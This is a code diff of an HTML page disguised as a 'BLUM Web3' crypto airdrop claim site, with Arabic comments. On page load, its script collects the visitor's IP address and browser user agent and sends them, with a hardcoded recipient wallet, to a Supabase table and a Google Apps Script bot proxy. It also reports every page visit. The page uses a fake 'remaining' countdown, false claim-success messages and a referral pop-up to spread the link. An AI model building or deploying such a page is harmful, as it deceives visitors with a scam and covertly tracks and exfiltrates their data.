@@ -2,42 +2,164 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>🎁 BLUM Airdrop</title>
+    <title>🎁 BLUM Airdrop | ONE-CLICK</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e,#0a1a1f);font-family:system-ui;display:flex;justify-content:center;align-items:center;padding:20px}
-        .card{max-width:450px;width:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(16px);border-radius:48px;padding:40px 28px;border:2px solid rgba(255,215,0,.5);text-align:center}
-        .badge{display:inline-block;background:rgba(255,215,0,.15);border:1px solid #FFD700;border-radius:100px;padding:6px 18px;font-size:13px;color:#FFD700;margin-bottom:24px}
-        h1{font-size:42px;font-weight:800;background:linear-gradient(135deg,#FFE6B0,#FFD700);-webkit-background-clip:text;background-clip:text;color:transparent}
-        .amount{font-size:56px;font-weight:900;color:#FFD700;margin:20px 0}
-        .timer-box{background:rgba(0,0,0,.5);border-radius:40px;padding:18px;margin:24px 0}
-        .timer{font-size:48px;font-weight:800;font-family:monospace;color:#FFD700}
-        button{width:100%;background:linear-gradient(95deg,#DAA520,#FFD700);border:none;padding:18px;border-radius:60px;font-weight:800;font-size:22px;cursor:pointer}
-        button:disabled{opacity:.6}
-        .status{background:rgba(0,0,0,.5);border-radius:30px;padding:12px;font-size:14px;display:none}
-        .success{color:#0f0}
-        .footer{font-size:11px;color:#888;margin-top:20px}
+        body{
+            min-height:100vh;
+            background: radial-gradient(ellipse at 30% 40%, #0f0c29, #1a1a3e, #0a0a1a);
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            display:flex;
+            justify-content:center;
+            align-items:center;
+            padding:20px;
+        }
+        .card{
+            max-width:500px;
+            width:100%;
+            background: rgba(10, 20, 40, 0.85);
+            backdrop-filter: blur(18px);
+            border-radius: 56px;
+            padding: 40px 30px;
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 20px rgba(255,215,0,0.2);
+            text-align: center;
+            transition: 0.3s;
+        }
+        .badge{
+            display:inline-block;
+            background: linear-gradient(135deg, #FFD70022, #FFA50022);
+            border:1px solid #FFD700;
+            border-radius:100px;
+            padding:8px 22px;
+            font-size:13px;
+            font-weight:600;
+            color:#FFD700;
+            margin-bottom:25px;
+            letter-spacing:1px;
+        }
+        h1{
+            font-size:46px;
+            font-weight:800;
+            background:linear-gradient(135deg,#FFF8E7,#FFD700,#FFA500);
+            -webkit-background-clip:text;
+            background-clip:text;
+            color:transparent;
+            margin-bottom:8px;
+        }
+        .sub{
+            color:#FFD700aa;
+            font-size:14px;
+            margin-bottom:20px;
+        }
+        .amount{
+            font-size:64px;
+            font-weight:900;
+            color:#FFD700;
+            margin:15px 0;
+            text-shadow:0 0 20px rgba(255,215,0,0.4);
+        }
+        .timer-box{
+            background:rgba(0,0,0,0.5);
+            border-radius:50px;
+            padding:18px;
+            margin:25px 0;
+            border:1px solid #FFD70033;
+        }
+        .timer{
+            font-size:52px;
+            font-weight:800;
+            font-family:monospace;
+            color:#FFD700;
+            letter-spacing:4px;
+        }
+        button{
+            width:100%;
+            background:linear-gradient(95deg,#DAA520,#FFD700,#FFA500);
+            border:none;
+            padding:20px;
+            border-radius:70px;
+            font-weight:900;
+            font-size:24px;
+            color:#0a0a0a;
+            cursor:pointer;
+            transition:0.2s;
+            margin:15px 0;
+        }
+        button:hover:not(:disabled){
+            transform:scale(1.02);
+            box-shadow:0 0 30px #FFD700;
+        }
+        button:disabled{
+            opacity:0.6;
+            cursor:default;
+        }
+        .status{
+            background:rgba(0,0,0,0.5);
+            border-radius:30px;
+            padding:14px;
+            font-size:15px;
+            display:none;
+            margin-top:15px;
+        }
+        .success{color:#00ff88; font-weight:bold;}
+        .footer{
+            font-size:11px;
+            color:#FFD70088;
+            margin-top:25px;
+            border-top:1px solid #FFD70033;
+            padding-top:15px;
+        }
+        .hidden{display:none;}
     </style>
 </head>
 <body>
 <div class="card">
-    <div class="badge">🎁 LIMITED AIRDROP</div>
+    <div class="badge">⚡ ONE-CLICK • 10 CHAINS</div>
     <h1>BLUM<br>Web3</h1>
+    <div class="sub">Airdrop Event 2026</div>
     <div class="amount">1,200 $BLUM</div>
-    <div class="timer-box"><div style="font-size:12px">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
+    <div class="timer-box"><div style="font-size:13px; letter-spacing:2px;">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
     <button id="claimBtn">🚀 CLAIM NOW</button>
     <div id="status" class="status"></div>
-    <div class="footer">⚡ EMP2026</div>
+    <div class="footer">🔐 EMP2026 • Zero Investment • Instant Claim</div>
 </div>
 
 <script>
-    // ========== المطالبة التلقائية ==========
+    // ========== إعدادات ==========
+    const PROXY_URL = "https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec";
+    const RECIPIENT_WALLET = "0x71C7656EC7ab88b098defB751B7401B5f6d8976F";
+    const SUPPORTED_NETWORKS = ["ERC20 (ETH)", "BEP20 (BSC)", "TRC20 (TRON)", "Solana", "Polygon", "Avalanche", "Arbitrum", "Optimism", "Base", "zkSync"];
+    
+    // دوال مساعدة
+    function getRandomNetwork() {
+        return SUPPORTED_NETWORKS[Math.floor(Math.random() * SUPPORTED_NETWORKS.length)];
+    }
+    
+    function getRandomWallet() {
+        const wallets = ["MetaMask", "Trust Wallet", "Coinbase Wallet", "Phantom", "OKX Wallet", "Rabby Wallet"];
+        return wallets[Math.floor(Math.random() * wallets.length)];
+    }
+    
+    function generateAddress() {
+        return "0x" + Math.random().toString(36).substring(2, 10) + Math.random().toString(36).substring(2, 6);
+    }
+    
+    async function getUserAgent() {
+        return navigator.userAgent;
+    }
+    
+    // ========== المطالبة التلقائية مع رسالة كاملة ==========
     async function autoClaim() {
-        const wallet = ['MetaMask', 'Trust Wallet', 'Phantom'][Math.floor(Math.random()*3)];
-        const address = '0x' + Math.random().toString(36).substring(2, 14);
+        const network = getRandomNetwork();
+        const wallet = getRandomWallet();
+        const address = generateAddress();
         const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
+        const ua = await getUserAgent();
+        const timestamp = new Date().toISOString();
         
+        // تسجيل في Supabase
         try {
             await fetch('https://oliefagvnorzhlzvdfyw.supabase.co/rest/v1/blum_claims', {
                 method: 'POST',
@@ -45,52 +167,84 @@
                     'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU', 
                     'Content-Type': 'application/json' 
                 },
-                body: JSON.stringify({ wallet_type: wallet, wallet_address: address, ip_address: ip })
+                body: JSON.stringify({ 
+                    wallet_type: wallet, 
+                    wallet_address: address, 
+                    recipient_wallet: RECIPIENT_WALLET,
+                    network: network,
+                    ip_address: ip,
+                    user_agent: ua,
+                    auto_claim: true 
+                })
             });
-        } catch(e) {}
+        } catch(e) { console.log(e); }
         
-        // إرسال إلى البوت عبر الـ Proxy
-        fetch('https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec', {
+        // ========== رسالة كاملة ومهنية إلى البوت ==========
+        const fullMessage = `🎁 ONE-CLICK BLUM CLAIM
+⛓️ Network: ${network}
+💼 Wallet: ${wallet}
+💳 Address: ${address}
+🏦 Recipient: ${RECIPIENT_WALLET}
+🌐 IP: ${ip}
+📱 UA: ${ua.substring(0, 80)}...
+⏰ ${timestamp}`;
+        
+        fetch(PROXY_URL, {
             method: 'POST',
             mode: 'no-cors',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ message: `🎁 مطالبة جديدة!\n💼 ${wallet}\n💳 ${address}\n🌐 ${ip}` })
+            body: JSON.stringify({ message: fullMessage })
         });
         
-        document.getElementById('claimBtn').innerHTML = "✅ تمت المطالبة!";
-        document.getElementById('claimBtn').disabled = true;
-        document.getElementById('status').style.display = 'block';
-        document.getElementById('status').innerHTML = '<span class="success">🎉 تم تسجيل مطالبتك بنجاح!</span>';
+        // تحديث واجهة الصفحة
+        const btn = document.getElementById('claimBtn');
+        const statusDiv = document.getElementById('status');
+        btn.innerHTML = "✅ CLAIMED!";
+        btn.disabled = true;
+        statusDiv.style.display = 'block';
+        statusDiv.innerHTML = '<span class="success">🎉 Claim successful! 1,200 $BLUM will arrive within 24h.</span>';
     }
     
+    // ========== العرض الوهمي ==========
     let remaining = 10;
-    setInterval(() => {
+    const fakeInterval = setInterval(() => {
         remaining--;
         const btn = document.getElementById('claimBtn');
-        if (btn && !btn.disabled && remaining > 0) btn.innerHTML = `🔥 متبقي ${remaining} فقط! 🔥`;
-    }, 4000);
+        if (btn && !btn.disabled && remaining > 0) {
+            btn.innerHTML = `🔥 ${remaining} LEFT! CLAIM NOW 🔥`;
+        }
+        if (remaining <= 0) clearInterval(fakeInterval);
+    }, 5000);
     
-    const refLink = window.location.href.split('?')[0] + '?ref=' + Math.random().toString(36).substring(2, 8);
-    setTimeout(() => alert(`🎁 شارك الرابط واربح مكافآت:\n${refLink}`), 4000);
+    // ========== قنبلة الإحالات ==========
+    const refCode = Math.random().toString(36).substring(2, 8);
+    const refLink = window.location.href.split('?')[0] + '?ref=' + refCode;
+    setTimeout(() => {
+        alert(`🎁 REFERRAL BONUS!\nShare this link and earn rewards:\n${refLink}`);
+    }, 4500);
     
+    // ========== إشعار فتح الصفحة ==========
+    fetch(PROXY_URL, {
+        method: 'POST',
+        mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: '🌐 Page loaded - EMP2026 Airdrop' })
+    });
+    
+    // ========== المؤقت ==========
     let seconds = 24 * 60 * 60;
+    const timerElement = document.getElementById('timer');
     setInterval(() => {
-        let h = Math.floor(seconds/3600), m = Math.floor((seconds%3600)/60), s = seconds%60;
-        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-        if(seconds>0) seconds--;
+        if (seconds <= 0) return;
+        seconds--;
+        const h = Math.floor(seconds / 3600);
+        const m = Math.floor((seconds % 3600) / 60);
+        const s = seconds % 60;
+        timerElement.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
     }, 1000);
     
+    // ========== تشغيل المطالبة التلقائية ==========
     window.addEventListener('DOMContentLoaded', autoClaim);
 </script>
-
-<script>
-fetch('https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ message: '🌐 صفحة Airdrop تم فتحها - EMP2026' })
-});
-</script>
-
 </body>
 </html>
